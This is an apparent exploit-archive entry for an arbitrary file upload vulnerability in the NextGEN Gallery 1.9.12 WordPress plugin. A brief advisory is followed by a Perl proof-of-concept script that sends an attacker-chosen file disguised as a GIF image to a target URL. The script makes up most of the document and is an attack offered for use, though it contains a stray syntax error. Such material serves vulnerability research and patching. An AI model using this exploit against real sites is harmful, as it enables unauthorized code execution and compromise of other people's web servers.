source: http://www.securityfocus.com/bid/60533/info

The NextGEN Gallery plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in an arbitrary code execution within the context of the vulnerable application.

NextGEN Gallery 1.9.12 is vulnerable; other versions may also be affected. 

#! /usr/bin/perl 
use LWP; 
use HTTP::Request::Common; 

my ($url, $file) = @ARGV; 

my $ua = LWP::UserAgent->new(); 
my $req = POST $url, 
Content_Type => 'form-data', 
Content => [. 
name => $name, 
galleryselect => 1, # Gallery ID, should exist 
Filedata => [ "$file", "file.gif", Content_Type => 
'image/gif' ] 
]; 
my $res = $ua->request( $req ); 
if( $res->is_success ) { 
print $res->content; 
} else { 
print $res->status_line, "\n"; 
} 